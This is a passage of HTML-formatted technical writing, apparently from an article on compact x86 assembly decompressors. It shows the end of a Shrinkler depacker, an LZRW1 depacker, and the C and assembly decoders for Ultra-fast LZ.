0</span>\n    <span style=\"color: #000000;\">inc</span>    <span style=\"color: #A90D91;\">eax</span>\n    <span style=\"color: #000000;\">stosd</span>                    <span style=\"color: #177500;\">; interval length = 1</span>\n\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #000000;\">init_get_bit</span>\n<span style=\"color: #000000;\">GetBit:</span>\n    <span style=\"color: #000000;\">pushad</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">ebp</span>, [<span style=\"color: #A90D91;\">ebx</span><span style=\"color: #000000;\">+shrinkler_ctx.range</span>   ]\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">ecx</span>, [<span style=\"color: #A90D91;\">ebx</span><span style=\"color: #000000;\">+shrinkler_ctx.interval</span>]\n    <span style=\"color: #000000;\">jmp</span>    <span style=\"color: #A90D91;\">ch</span><span style=\"color: #000000;\">eck_interval</span>\n<span style=\"color: #000000;\">readbit:</span>\n    <span style=\"color: #000000;\">add</span>    <span style=\"color: #A90D91;\">al</span>, <span style=\"color: #A90D91;\">al</span>\n    <span style=\"color: #000000;\">jne</span>    <span style=\"color: #000000;\">nonewword</span>\n    <span style=\"color: #000000;\">lodsb</span>\n    <span style=\"color: #000000;\">adc</span>    <span style=\"color: #A90D91;\">al</span>, <span style=\"color: #A90D91;\">al</span>\n<span style=\"color: #000000;\">nonewword:</span>\n    <span style=\"color: #000000;\">mov</span>    [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+pushad_t.eax</span>], <span style=\"color: #A90D91;\">eax</span>\n    <span style=\"color: #000000;\">mov</span>    [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+pushad_t.esi</span>], <span style=\"color: #A90D91;\">esi</span>\n    <span style=\"color: #000000;\">adc</span>    <span style=\"color: #A90D91;\">ebp</span>, <span style=\"color: #A90D91;\">ebp</span>\n    <span style=\"color: #000000;\">add</span>    <span style=\"color: #A90D91;\">ecx</span>, <span style=\"color: #A90D91;\">ecx</span>\n<span style=\"color: #000000;\">check_interval:</span>\n    <span style=\"color: #000000;\">test</span>   <span style=\"color: #A90D91;\">cx</span>, <span style=\"color: #A90D91;\">cx</span>\n    <span style=\"color: #000000;\">jns</span>    <span style=\"color: #000000;\">readbit</span>\n\n    <span style=\"color: #000000;\">lea</span>    <span style=\"color: #A90D91;\">edi</span>, [<span style=\"color: #000000;\">shrinkler_ctx_size</span> <span style=\"color: #000000;\">+</span> <span style=\"color: #A90D91;\">ebx</span> <span style=\"color: #000000;\">+</span> <span style=\"color: #1C01CE;\">2</span><span style=\"color: #000000;\">*</span><span style=\"color: #A90D91;\">edx</span> <span style=\"color: #000000;\">+</span> <span style=\"color: #A90D91;\">SI</span><span style=\"color: #000000;\">NGLE_BIT_CONTEXTS*</span><span style=\"color: #1C01CE;\">2</span>]\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">ax</span>, <span style=\"color: #A90D91;\">word</span>[<span style=\"color: #A90D91;\">edi</span>]\n\n    <span style=\"color: #000000;\">shr</span>    <span style=\"color: #A90D91;\">eax</span>, <span style=\"color: #000000;\">ADJUST_SHIFT</span>\n    <span style=\"color: #000000;\">sub</span>    [<span style=\"color: #A90D91;\">edi</span>], <span style=\"color: #A90D91;\">ax</span>\n    <span style=\"color: #000000;\">add</span>    <span style=\"color: #A90D91;\">ax</span>, [<span style=\"color: #A90D91;\">edi</span>]\n\n    <span style=\"color: #000000;\">cdq</span>\n    <span style=\"color: #000000;\">mul</span>    <span style=\"color: #A90D91;\">cx</span>\n\n    <span style=\"color: #000000;\">sub</span>    <span style=\"color: #A90D91;\">ebp</span>, <span style=\"color: #A90D91;\">edx</span>\n    <span style=\"color: #000000;\">jc</span>    <span style=\"color: #000000;\">.one</span>\n<span style=\"color: #000000;\">.zero:</span>\n    <span style=\"color: #177500;\">; oneprob = oneprob * (1 - adjust) = oneprob - oneprob * adjust</span>\n    <span style=\"color: #000000;\">sub</span>    <span style=\"color: #A90D91;\">ecx</span>, <span style=\"color: #A90D91;\">edx</span>\n    <span style=\"color: #177500;\">; 0 in C and X</span>\n    <span style=\"color: #000000;\">jmp</span>    <span style=\"color: #000000;\">exit_getbit</span>\n<span style=\"color: #000000;\">.one:</span>\n    <span style=\"color: #177500;\">; onebrob = 1 - (1 - oneprob) * (1 - adjust) = oneprob - oneprob * adjust + adjust</span>\n    <span style=\"color: #000000;\">add</span>    <span style=\"color: #A90D91;\">word</span>[<span style=\"color: #A90D91;\">edi</span>], (<span style=\"color: #1C01CE;\">0xFFFF</span> <span style=\"color: #000000;\">&gt;&gt;</span> <span style=\"color: #000000;\">ADJUST_SHIFT</span>)\n    <span style=\"color: #000000;\">xchg</span>   <span style=\"color: #A90D91;\">edx</span>, <span style=\"color: #A90D91;\">ecx</span>\n    <span style=\"color: #000000;\">add</span>    <span style=\"color: #A90D91;\">ebp</span>, <span style=\"color: #A90D91;\">ecx</span>\n    <span style=\"color: #177500;\">; 1 in C and X</span>\n<span style=\"color: #000000;\">exit_getbit:</span>\n    <span style=\"color: #000000;\">mov</span>    [<span style=\"color: #A90D91;\">ebx</span><span style=\"color: #000000;\">+shrinkler_ctx.range</span>   ], <span style=\"color: #A90D91;\">ebp</span>\n    <span style=\"color: #000000;\">mov</span>    [<span style=\"color: #A90D91;\">ebx</span><span style=\"color: #000000;\">+shrinkler_ctx.interval</span>], <span style=\"color: #A90D91;\">ecx</span>\n    <span style=\"color: #000000;\">popad</span>\n    <span style=\"color: #000000;\">ret</span>\n<span style=\"color: #000000;\">GetKind:</span>\n    <span style=\"color: #177500;\">; Use parity as context</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">edx</span>, <span style=\"color: #A90D91;\">edi</span>\n    <span style=\"color: #000000;\">and</span>    <span style=\"color: #A90D91;\">edx</span>, <span style=\"color: #1C01CE;\">1</span>\n    <span style=\"color: #000000;\">shl</span>    <span style=\"color: #A90D91;\">edx</span>, <span style=\"color: #1C01CE;\">8</span>\n    <span style=\"color: #000000;\">jmp</span>    <span style=\"color: #A90D91;\">ebp</span>\n<span style=\"color: #000000;\">GetNumber:</span>\n    <span style=\"color: #000000;\">cdq</span>\n    <span style=\"color: #000000;\">adc</span>    <span style=\"color: #A90D91;\">dh</span>, <span style=\"color: #1C01CE;\">3</span>\n<span style=\"color: #000000;\">.numberloop:</span>\n    <span style=\"color: #000000;\">inc</span>    <span style=\"color: #A90D91;\">edx</span>\n    <span style=\"color: #000000;\">inc</span>    <span style=\"color: #A90D91;\">edx</span>\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #A90D91;\">ebp</span>\n    <span style=\"color: #000000;\">jc</span>    <span style=\"color: #000000;\">.numberloop</span>\n    <span style=\"color: #000000;\">push</span>   <span style=\"color: #1C01CE;\">1</span>\n    <span style=\"color: #000000;\">pop</span>    <span style=\"color: #A90D91;\">ecx</span>\n    <span style=\"color: #000000;\">dec</span>    <span style=\"color: #A90D91;\">edx</span>\n<span style=\"color: #000000;\">.bitsloop:</span>\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #A90D91;\">ebp</span>\n    <span style=\"color: #000000;\">adc</span>    <span style=\"color: #A90D91;\">ecx</span>, <span style=\"color: #A90D91;\">ecx</span>\n    <span style=\"color: #000000;\">sub</span>    <span style=\"color: #A90D91;\">dl</span>, <span style=\"color: #1C01CE;\">2</span>\n    <span style=\"color: #000000;\">jnc</span>   <span style=\"color: #000000;\">.bitsloop</span>\n    <span style=\"color: #000000;\">ret</span>\n\n<span style=\"color: #000000;\">init_get_bit:</span>\n    <span style=\"color: #000000;\">pop</span>    <span style=\"color: #A90D91;\">ebp</span>               <span style=\"color: #177500;\">; ebp = GetBit</span>\n\n    <span style=\"color: #177500;\">; Init probabilities</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">ch</span>, <span style=\"color: #000000;\">NUM_CONTEXTS</span> <span style=\"color: #000000;\">&gt;&gt;</span> <span style=\"color: #1C01CE;\">8</span>\n    <span style=\"color: #000000;\">xor</span>    <span style=\"color: #A90D91;\">eax</span>, <span style=\"color: #A90D91;\">eax</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">ah</span>, <span style=\"color: #1C01CE;\">1</span><span style=\"color: #000000;\">&lt;&lt;</span><span style=\"color: #1C01CE;\">7</span>\n    <span style=\"color: #000000;\">rep</span>    <span style=\"color: #000000;\">stosw</span>\n    <span style=\"color: #000000;\">xchg</span>   <span style=\"color: #A90D91;\">al</span>, <span style=\"color: #A90D91;\">ah</span>\n\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">edi</span>, <span style=\"color: #A90D91;\">ebx</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">ebx</span>, <span style=\"color: #A90D91;\">esp</span>\n\n    <span style=\"color: #177500;\">; edx = 0</span>\n    <span style=\"color: #000000;\">cdq</span>\n<span style=\"color: #000000;\">.lit:</span>\n    <span style=\"color: #177500;\">; Literal</span>\n    <span style=\"color: #000000;\">inc</span>    <span style=\"color: #A90D91;\">edx</span>\n<span style=\"color: #000000;\">.getlit:</span>\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #A90D91;\">ebp</span>\n    <span style=\"color: #000000;\">adc</span>    <span style=\"color: #A90D91;\">dl</span>, <span style=\"color: #A90D91;\">dl</span>\n    <span style=\"color: #000000;\">jnc</span>    <span style=\"color: #000000;\">.getlit</span>\n\n    <span style=\"color: #000000;\">mov</span>    [<span style=\"color: #A90D91;\">edi</span>], <span style=\"color: #A90D91;\">dl</span>\n    <span style=\"color: #000000;\">inc</span>    <span style=\"color: #A90D91;\">edi</span>\n<span style=\"color: #000000;\">.switch:</span>\n    <span style=\"color: #177500;\">; After literal</span>\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #000000;\">GetKind</span>\n    <span style=\"color: #000000;\">jnc</span>    <span style=\"color: #000000;\">.lit</span>\n\n    <span style=\"color: #177500;\">; Reference</span>\n    <span style=\"color: #000000;\">cdq</span>\n    <span style=\"color: #000000;\">dec</span>    <span style=\"color: #A90D91;\">edx</span>\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #A90D91;\">ebp</span>\n    <span style=\"color: #000000;\">jnc</span>    <span style=\"color: #000000;\">.readoffset</span>\n<span style=\"color: #000000;\">.readlength:</span>\n    <span style=\"color: #000000;\">clc</span>\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #000000;\">GetNumber</span>\n    <span style=\"color: #000000;\">push</span>   <span style=\"color: #A90D91;\">esi</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">esi</span>, <span style=\"color: #A90D91;\">edi</span>\n    <span style=\"color: #000000;\">add</span>    <span style=\"color: #A90D91;\">esi</span>, <span style=\"color: #A90D91;\">dword</span>[<span style=\"color: #A90D91;\">ebx</span><span style=\"color: #000000;\">+shrinkler_ctx.ofs</span>]\n    <span style=\"color: #000000;\">rep</span>    <span style=\"color: #000000;\">movsb</span>\n    <span style=\"color: #000000;\">pop</span>    <span style=\"color: #A90D91;\">esi</span>\n\n    <span style=\"color: #177500;\">; After reference</span>\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #000000;\">GetKind</span>\n    <span style=\"color: #000000;\">jnc</span>   <span style=\"color: #000000;\">.lit</span>\n<span style=\"color: #000000;\">.readoffset:</span>\n    <span style=\"color: #000000;\">stc</span>\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #000000;\">GetNumber</span>\n    <span style=\"color: #000000;\">neg</span>    <span style=\"color: #A90D91;\">ecx</span>\n    <span style=\"color: #000000;\">inc</span>    <span style=\"color: #A90D91;\">ecx</span>\n    <span style=\"color: #000000;\">inc</span>    <span style=\"color: #A90D91;\">ecx</span>\n    <span style=\"color: #000000;\">mov</span>    [<span style=\"color: #A90D91;\">ebx</span><span style=\"color: #000000;\">+shrinkler_ctx.ofs</span>], <span style=\"color: #A90D91;\">ecx</span>\n    <span style=\"color: #000000;\">jne</span>   <span style=\"color: #000000;\">.readlength</span>\n\n    <span style=\"color: #177500;\">; return depacked length</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">esp</span>, [<span style=\"color: #A90D91;\">ebx</span><span style=\"color: #000000;\">+shrinkler_ctx.esp</span>]\n    <span style=\"color: #000000;\">sub</span>    <span style=\"color: #A90D91;\">edi</span>, [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">32</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">4</span>]\n    <span style=\"color: #000000;\">mov</span>    [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+pushad_t.eax</span>], <span style=\"color: #A90D91;\">edi</span>\n    <span style=\"color: #000000;\">popad</span>\n    <span style=\"color: #000000;\">ret</span>\n</pre>\n</div>\n<h2 id=\"misc\">12. C/x86 assembly</h2>\n<p>The following algorithms were translated from C to x86 assembly or were already implemented in x86 assembly and optimized for size.</p>\n<h2 id=\"lzrw\">12.1 Lempel-Ziv Ross Williams (LZRW)</h2>\n<p>Designed by <a href=\"http://ross.net/compression/lzrw1.html\">Ross Williams</a> and described in <a href=\"https://ieeexplore.ieee.org/document/213344\">An Extremely Fast Ziv-Lempel Data Compression Algorithm</a> published in 1991. The compression ratio is only slightly worse than LZ77 but is much faster at compression.</p>\n<div class=\"highlight\" style=\"background: #ffffff;\">\n<pre style=\"line-height: 125%;\"><span></span><span style=\"color: #000000;\">lzrw1_depack:</span>\n<span style=\"color: #000000;\">_lzrw1_depack:</span>\n    <span style=\"color: #000000;\">pushad</span>\n    <span style=\"color: #000000;\">lea</span>    <span style=\"color: #A90D91;\">esi</span>, [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">32</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">4</span>]\n    <span style=\"color: #000000;\">lodsd</span>\n    <span style=\"color: #000000;\">xchg</span>   <span style=\"color: #A90D91;\">edi</span>, <span style=\"color: #A90D91;\">eax</span>        <span style=\"color: #177500;\">; edi = outbuf</span>\n    <span style=\"color: #000000;\">lodsd</span>\n    <span style=\"color: #000000;\">xchg</span>   <span style=\"color: #A90D91;\">ebp</span>, <span style=\"color: #A90D91;\">eax</span>        <span style=\"color: #177500;\">; ebp = inlen</span>\n    <span style=\"color: #000000;\">lodsd</span>\n    <span style=\"color: #000000;\">xchg</span>   <span style=\"color: #A90D91;\">esi</span>, <span style=\"color: #A90D91;\">eax</span>        <span style=\"color: #177500;\">; esi = inbuf</span>\n    <span style=\"color: #000000;\">add</span>    <span style=\"color: #A90D91;\">ebp</span>, <span style=\"color: #A90D91;\">esi</span>        <span style=\"color: #177500;\">; ebp = inbuf + inlen</span>\n<span style=\"color: #000000;\">L0:</span>\n    <span style=\"color: #000000;\">push</span>   <span style=\"color: #1C01CE;\">16</span> <span style=\"color: #000000;\">+</span> <span style=\"color: #1C01CE;\">1</span>          <span style=\"color: #177500;\">; bits = 16</span>\n    <span style=\"color: #000000;\">pop</span>    <span style=\"color: #A90D91;\">edx</span>\n    <span style=\"color: #000000;\">lodsw</span>                  <span style=\"color: #177500;\">; ctrl = *in++, ctrl |= (*in++) &lt;&lt; 8</span>\n    <span style=\"color: #000000;\">xchg</span>   <span style=\"color: #A90D91;\">ebx</span>, <span style=\"color: #A90D91;\">eax</span>        \n<span style=\"color: #000000;\">L1:</span>\n    <span style=\"color: #177500;\">; while(in != end) {</span>\n    <span style=\"color: #000000;\">cmp</span>    <span style=\"color: #A90D91;\">esi</span>, <span style=\"color: #A90D91;\">ebp</span>\n    <span style=\"color: #000000;\">je</span>     <span style=\"color: #000000;\">L4</span>\n    <span style=\"color: #177500;\">; if(--bits == 0) goto L0</span>\n    <span style=\"color: #000000;\">dec</span>    <span style=\"color: #A90D91;\">edx</span>\n    <span style=\"color: #000000;\">jz</span>     <span style=\"color: #000000;\">L0</span>\n<span style=\"color: #000000;\">L2:</span>\n    <span style=\"color: #177500;\">; if(ctrl &amp; 1) {</span>\n    <span style=\"color: #000000;\">shr</span>    <span style=\"color: #A90D91;\">ebx</span>, <span style=\"color: #1C01CE;\">1</span>\n    <span style=\"color: #000000;\">jc</span>     <span style=\"color: #000000;\">L3</span>\n    <span style=\"color: #000000;\">movsb</span>                  <span style=\"color: #177500;\">; *out++ = *in++;</span>\n    <span style=\"color: #000000;\">jmp</span>    <span style=\"color: #000000;\">L1</span>\n<span style=\"color: #000000;\">L3:</span>\n    <span style=\"color: #000000;\">lodsb</span>                  <span style=\"color: #177500;\">; ofs = (*in &amp; 0xF0) &lt;&lt; 4</span>\n    <span style=\"color: #000000;\">aam</span>    <span style=\"color: #1C01CE;\">16</span>\n    <span style=\"color: #000000;\">cwde</span>\n    <span style=\"color: #000000;\">movzx</span>  <span style=\"color: #A90D91;\">ecx</span>, <span style=\"color: #A90D91;\">al</span>\n    <span style=\"color: #000000;\">inc</span>    <span style=\"color: #A90D91;\">ecx</span>\n    <span style=\"color: #000000;\">lodsb</span>                  <span style=\"color: #177500;\">; ofs |= *in++ &amp; 0xFF;</span>\n    <span style=\"color: #000000;\">push</span>   <span style=\"color: #A90D91;\">esi</span>             <span style=\"color: #177500;\">; save pointer to in</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">esi</span>, <span style=\"color: #A90D91;\">edi</span>        <span style=\"color: #177500;\">; ptr  = out - ofs;</span>\n    <span style=\"color: #000000;\">sub</span>    <span style=\"color: #A90D91;\">esi</span>, <span style=\"color: #A90D91;\">eax</span>\n    <span style=\"color: #000000;\">rep</span>    <span style=\"color: #000000;\">movsb</span>           <span style=\"color: #177500;\">; while(len--) *out++ = *ptr++;</span>\n    <span style=\"color: #000000;\">pop</span>    <span style=\"color: #A90D91;\">esi</span>             <span style=\"color: #177500;\">; restore pointer to in</span>\n    <span style=\"color: #000000;\">jmp</span>    <span style=\"color: #000000;\">L1</span>\n<span style=\"color: #000000;\">L4:</span>\n    <span style=\"color: #000000;\">sub</span>    <span style=\"color: #A90D91;\">edi</span>, [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">32</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">4</span>] <span style=\"color: #177500;\">; edi = out - outbuf</span>\n    <span style=\"color: #000000;\">mov</span>    [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">28</span>], <span style=\"color: #A90D91;\">edi</span>   <span style=\"color: #177500;\">; esp+_eax = edi</span>\n    <span style=\"color: #000000;\">popad</span>\n    <span style=\"color: #000000;\">ret</span>\n</pre>\n</div>\n<h2 id=\"ulz\">12.2 Ultra-fast LZ (ULZ)</h2>\n<p><a href=\"https://github.com/encode84/ulz\">Ultra-fast LZ</a> was first published by <a href=\"https://github.com/encode84\">Ilya &#8220;encode&#8221; Muravyov</a> in 2010 and then appears to have been <a href=\"https://encode.su/threads/550-Ultra-fast-LZ\">open sourced in 2019</a>. The following code is a straightforward translation of the C decoder to x86 assembly.</p>\n<div class=\"highlight\" style=\"background: #ffffff;\">\n<pre style=\"line-height: 125%;\"><span></span><span style=\"color: #008800; font-weight: bold;\">static</span> <span style=\"color: #333399; font-weight: bold;\">uint32_t</span> <span style=\"color: #0066BB; font-weight: bold;\">add_mod</span>(<span style=\"color: #333399; font-weight: bold;\">uint32_t</span> x, <span style=\"color: #333399; font-weight: bold;\">uint8_t</span><span style=\"color: #333333;\">**</span> p);\n\n<span style=\"color: #333399; font-weight: bold;\">uint32_t</span> <span style=\"color: #0066BB; font-weight: bold;\">ulz_depack</span>(\n  <span style=\"color: #333399; font-weight: bold;\">void</span> <span style=\"color: #333333;\">*</span>outbuf,\n  <span style=\"color: #333399; font-weight: bold;\">uint32_t</span> inlen,\n  <span style=\"color: #008800; font-weight: bold;\">const</span> <span style=\"color: #333399; font-weight: bold;\">void</span> <span style=\"color: #333333;\">*</span>inbuf) \n{\n    <span style=\"color: #333399; font-weight: bold;\">uint8_t</span>  <span style=\"color: #333333;\">*</span>ptr, <span style=\"color: #333333;\">*</span>in, <span style=\"color: #333333;\">*</span>end, <span style=\"color: #333333;\">*</span>out;\n    <span style=\"color: #333399; font-weight: bold;\">uint32_t</span> dist, len;\n    <span style=\"color: #333399; font-weight: bold;\">uint8_t</span>  token;\n\n    out <span style=\"color: #333333;\">=</span> (<span style=\"color: #333399; font-weight: bold;\">uint8_t</span><span style=\"color: #333333;\">*</span>)outbuf;\n    in  <span style=\"color: #333333;\">=</span> (<span style=\"color: #333399; font-weight: bold;\">uint8_t</span><span style=\"color: #333333;\">*</span>)inbuf;\n    end <span style=\"color: #333333;\">=</span> in <span style=\"color: #333333;\">+</span> inlen;\n    \n    <span style=\"color: #008800; font-weight: bold;\">while</span>(in <span style=\"color: #333333;\">&lt;</span> end) {\n      token <span style=\"color: #333333;\">=</span> <span style=\"color: #333333;\">*</span>in<span style=\"color: #333333;\">++</span>;\n      <span style=\"color: #008800; font-weight: bold;\">if</span>(token <span style=\"color: #333333;\">&gt;=</span> <span style=\"color: #0000DD; font-weight: bold;\">32</span>) {\n        len <span style=\"color: #333333;\">=</span> token <span style=\"color: #333333;\">&gt;&gt;</span> <span style=\"color: #0000DD; font-weight: bold;\">5</span>;\n        <span style=\"color: #008800; font-weight: bold;\">if</span>(len <span style=\"color: #333333;\">==</span> <span style=\"color: #0000DD; font-weight: bold;\">7</span>) \n          len <span style=\"color: #333333;\">=</span> add_mod(len, <span style=\"color: #333333;\">&amp;</span>in);\n        <span style=\"color: #008800; font-weight: bold;\">while</span>(len<span style=\"color: #333333;\">--</span>) <span style=\"color: #333333;\">*</span>out<span style=\"color: #333333;\">++</span> <span style=\"color: #333333;\">=</span> <span style=\"color: #333333;\">*</span>in<span style=\"color: #333333;\">++</span>;\n        <span style=\"color: #008800; font-weight: bold;\">if</span>(in <span style=\"color: #333333;\">&gt;=</span> end) <span style=\"color: #008800; font-weight: bold;\">break</span>;\n      }\n      len <span style=\"color: #333333;\">=</span> (token <span style=\"color: #333333;\">&amp;</span> <span style=\"color: #0000DD; font-weight: bold;\">15</span>) <span style=\"color: #333333;\">+</span> <span style=\"color: #0000DD; font-weight: bold;\">4</span>;\n      <span style=\"color: #008800; font-weight: bold;\">if</span>(len <span style=\"color: #333333;\">==</span> (<span style=\"color: #0000DD; font-weight: bold;\">15</span> <span style=\"color: #333333;\">+</span> <span style=\"color: #0000DD; font-weight: bold;\">4</span>)) \n        len <span style=\"color: #333333;\">=</span> add_mod(len, <span style=\"color: #333333;\">&amp;</span>in);\n      dist <span style=\"color: #333333;\">=</span> ((token <span style=\"color: #333333;\">&amp;</span> <span style=\"color: #0000DD; font-weight: bold;\">16</span>) <span style=\"color: #333333;\">&lt;&lt;</span> <span style=\"color: #0000DD; font-weight: bold;\">12</span>) <span style=\"color: #333333;\">+</span> <span style=\"color: #333333;\">*</span>(<span style=\"color: #333399; font-weight: bold;\">uint16_t</span><span style=\"color: #333333;\">*</span>)in;\n      in <span style=\"color: #333333;\">+=</span> <span style=\"color: #0000DD; font-weight: bold;\">2</span>;\n      ptr <span style=\"color: #333333;\">=</span> out <span style=\"color: #333333;\">-</span> dist;\n      <span style=\"color: #008800; font-weight: bold;\">while</span>(len<span style=\"color: #333333;\">--</span>) <span style=\"color: #333333;\">*</span>out<span style=\"color: #333333;\">++</span> <span style=\"color: #333333;\">=</span> <span style=\"color: #333333;\">*</span>ptr<span style=\"color: #333333;\">++</span>;\n    }\n    <span style=\"color: #008800; font-weight: bold;\">return</span> (<span style=\"color: #333399; font-weight: bold;\">uint32_t</span>)(out <span style=\"color: #333333;\">-</span> (<span style=\"color: #333399; font-weight: bold;\">uint8_t</span><span style=\"color: #333333;\">*</span>)outbuf);\n}\n\n<span style=\"color: #008800; font-weight: bold;\">static</span> <span style=\"color: #333399; font-weight: bold;\">uint32_t</span> <span style=\"color: #0066BB; font-weight: bold;\">add_mod</span>(<span style=\"color: #333399; font-weight: bold;\">uint32_t</span> x, <span style=\"color: #333399; font-weight: bold;\">uint8_t</span><span style=\"color: #333333;\">**</span> p) {\n    <span style=\"color: #333399; font-weight: bold;\">uint8_t</span> c, i;\n    \n    <span style=\"color: #008800; font-weight: bold;\">for</span>(i<span style=\"color: #333333;\">=</span><span style=\"color: #0000DD; font-weight: bold;\">0</span>; i<span style=\"color: #333333;\">&lt;=</span><span style=\"color: #0000DD; font-weight: bold;\">21</span>; i<span style=\"color: #333333;\">+=</span><span style=\"color: #0000DD; font-weight: bold;\">7</span>) {\n      c <span style=\"color: #333333;\">=</span> <span style=\"color: #333333;\">*</span>(<span style=\"color: #333333;\">*</span>p)<span style=\"color: #333333;\">++</span>;\n      x <span style=\"color: #333333;\">+=</span> (c <span style=\"color: #333333;\">&lt;&lt;</span> i);\n      <span style=\"color: #008800; font-weight: bold;\">if</span>(c <span style=\"color: #333333;\">&lt;</span> <span style=\"color: #0000DD; font-weight: bold;\">128</span>) <span style=\"color: #008800; font-weight: bold;\">break</span>;\n    }\n    <span style=\"color: #008800; font-weight: bold;\">return</span> x;\n}\n</pre>\n</div>\n<div class=\"highlight\" style=\"background: #ffffff;\">\n<pre style=\"line-height: 125%;\"><span></span><span style=\"color: #000000;\">ulz_depack:</span>\n<span style=\"color: #000000;\">_ulz_depack:</span>\n    <span style=\"color: #000000;\">pushad</span>\n    <span style=\"color: #000000;\">lea</span>    <span style=\"color: #A90D91;\">esi</span>, [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">32</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">4</span>]\n    <span style=\"color: #000000;\">lodsd</span>\n    <span style=\"color: #000000;\">xchg</span>   <span style=\"color: #A90D91;\">edi</span>, <span style=\"color: #A90D91;\">eax</span>          <span style=\"color: #177500;\">; edi = outbuf</span>\n    <span style=\"color: #000000;\">lodsd</span>\n    <span style=\"color: #000000;\">xchg</span>   <span style=\"color: #A90D91;\">ebx</span>, <span style=\"color: #A90D91;\">eax</span>\n    <span style=\"color: #000000;\">lodsd</span>\n    <span style=\"color: #000000;\">xchg</span>   <span style=\"color: #A90D91;\">esi</span>, <span style=\"color: #A90D91;\">eax</span>          <span style=\"color: #177500;\">; esi = inbuf</span>\n    <span style=\"color: #000000;\">add</span>    <span style=\"color: #A90D91;\">ebx</span>, <span style=\"color: #A90D91;\">esi</span>          <span style=\"color: #177500;\">; ebx += inbuf</span>\n<span style=\"color: #000000;\">ulz_main:</span>\n    <span style=\"color: #000000;\">xor</span>    <span style=\"color: #A90D91;\">ecx</span>, <span style=\"color: #A90D91;\">ecx</span>\n    <span style=\"color: #000000;\">mul</span>    <span style=\"color: #A90D91;\">ecx</span>\n    <span style=\"color: #177500;\">; while (in &lt; end) {</span>\n    <span style=\"color: #000000;\">cmp</span>    <span style=\"color: #A90D91;\">esi</span>, <span style=\"color: #A90D91;\">ebx</span>\n    <span style=\"color: #000000;\">jnb</span>    <span style=\"color: #000000;\">ulz_exit</span>\n    <span style=\"color: #177500;\">; token = *in++;</span>\n    <span style=\"color: #000000;\">lodsb</span>\n    <span style=\"color: #177500;\">; if(token &gt;= 32) {</span>\n    <span style=\"color: #000000;\">cmp</span>    <span style=\"color: #A90D91;\">al</span>, <span style=\"color: #1C01CE;\">32</span>\n    <span style=\"color: #000000;\">jb</span>     <span style=\"color: #000000;\">ulz_copy2</span>\n    <span style=\"color: #177500;\">; len = token &gt;&gt; 5</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">cl</span>, <span style=\"color: #A90D91;\">al</span>\n    <span style=\"color: #000000;\">shr</span>    <span style=\"color: #A90D91;\">cl</span>, <span style=\"color: #1C01CE;\">5</span>\n    <span style=\"color: #177500;\">; if(len == 7)</span>\n    <span style=\"color: #000000;\">cmp</span>    <span style=\"color: #A90D91;\">cl</span>, <span style=\"color: #1C01CE;\">7</span>\n    <span style=\"color: #000000;\">jne</span>    <span style=\"color: #000000;\">ulz_copy1</span>\n    <span style=\"color: #177500;\">; len = add_mod(len, &amp;in);</span>\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #000000;\">add_mod</span>\n<span style=\"color: #000000;\">ulz_copy1:</span>\n    <span style=\"color: #177500;\">; while(len--) *out++ = *in++;</span>\n    <span style=\"color: #000000;\">rep</span>    <span style=\"color: #000000;\">movsb</span>\n    <span style=\"color: #177500;\">; if(in &gt;= end) break;</span>\n    <span style=\"color: #000000;\">cmp</span>    <span style=\"color: #A90D91;\">esi</span>, <span style=\"color: #A90D91;\">ebx</span>\n    <span style=\"color: #000000;\">jae</span>    <span style=\"color: #000000;\">ulz_exit</span>\n<span style=\"color: #000000;\">ulz_copy2:</span>\n    <span style=\"color: #177500;\">; len = (token &amp; 15) + 4;</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">cl</span>, <span style=\"color: #A90D91;\">al</span>\n    <span style=\"color: #000000;\">and</span>    <span style=\"color: #A90D91;\">cl</span>, <span style=\"color: #1C01CE;\">15</span>\n    <span style=\"color: #000000;\">add</span>    <span style=\"color: #A90D91;\">cl</span>, <span style=\"color: #1C01CE;\">4</span>\n    <span style=\"color: #177500;\">; if(len == (15 + 4))</span>\n    <span style=\"color: #000000;\">cmp</span>    <span style=\"color: #A90D91;\">cl</span>, <span style=\"color: #1C01CE;\">15</span> <span style=\"color: #000000;\">+</span> <span style=\"color: #1C01CE;\">4</span>\n    <span style=\"color: #000000;\">jne</span>    <span style=\"color: 